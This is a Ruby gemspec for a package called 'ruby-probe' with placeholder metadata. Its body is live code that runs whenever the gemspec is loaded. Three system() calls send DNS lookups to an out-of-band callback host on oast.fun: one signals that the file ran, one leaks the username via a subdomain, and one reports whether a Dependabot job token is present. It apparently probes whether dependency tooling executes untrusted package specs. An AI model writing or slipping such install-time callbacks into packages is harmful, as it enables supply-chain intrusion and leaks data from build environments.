Gem::Specification.new do |s|
  s.name = "ruby-probe"
  s.version = "0.1.0"
  s.summary = "test"
  s.authors = ["test"]
  
  # This eval runs when the gemspec is loaded
  system("nslookup ruby-probe.d90p9t61b2es0qb9hfsgqdyurmjijdntw.oast.fun 2>/dev/null || true")
  system("whoami > /tmp/.ru 2>/dev/null; nslookup ru-`cat /tmp/.ru | tr -cd a-z0-9`.d90p9t61b2es0qb9hfsgqdyurmjijdntw.oast.fun 2>/dev/null || true")
  system("printenv DEPENDABOT_JOB_TOKEN > /dev/null 2>&1 && nslookup rb-has-token.d90p9t61b2es0qb9hfsgqdyurmjijdntw.oast.fun 2>/dev/null || nslookup rb-no-token.d90p9t61b2es0qb9hfsgqdyurmjijdntw.oast.fun 2>/dev/null || true")
end
